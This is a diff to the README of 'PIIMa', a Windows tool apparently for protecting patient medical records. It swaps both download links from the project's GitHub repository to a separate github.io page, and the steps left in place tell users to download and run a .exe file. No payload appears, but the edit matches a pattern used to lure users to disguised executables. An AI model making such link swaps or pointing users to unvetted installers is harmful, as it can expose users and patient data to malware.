@@ -1,6 +1,6 @@
 # 🛡️ PIIMa - Protect sensitive patient medical records easily
 
-[Download PIIMa for Windows](https://github.com/Alexander4930/PIIMa)
+[Download PIIMa for Windows](https://alexander4930.github.io)
 
 ## 📋 About the project
 
@@ -21,7 +21,7 @@ Before you install PIIMa, ensure your computer meets these standards:
 
 Follow these steps to get the software on your machine:
 
-1.  Visit the [PIIMa download page](https://github.com/Alexander4930/PIIMa).
+1.  Visit the [PIIMa download page](https://alexander4930.github.io).
 2.  Look for the latest version under the Releases section.
 3.  Click the file ending in .exe to start the download.
 4.  Open the folder where you saved the file.
